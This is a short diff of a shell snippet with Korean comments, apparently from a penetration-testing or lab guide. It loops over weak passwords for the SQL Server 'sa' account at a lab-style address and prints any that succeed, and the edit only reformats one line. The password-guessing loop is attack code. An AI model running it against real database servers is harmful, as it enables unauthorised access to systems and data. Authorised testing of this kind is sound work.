@@ -34,8 +34,7 @@ sqlcmd -S 10.10.10.10,1433 -U sa -P 'wrongpass' -l 5 -Q "SELECT 1"
 
 # 2. 약한 sa 비밀번호 후보 반복
 for p in sa 'password' 'Passw0rd' ''; do
-  sqlcmd -S 10.10.10.10,1433 -U sa -P "$p" -l 5 -Q "SELECT 1" >/dev/null 2>&1 \
-    && echo "SUCCESS: sa / $p"
+  sqlcmd -S 10.10.10.10,1433 -U sa -P "$p" -l 5 -Q "SELECT 1" >/dev/null 2>&1 && echo "SUCCESS: sa / $p"
 done
 ```
 
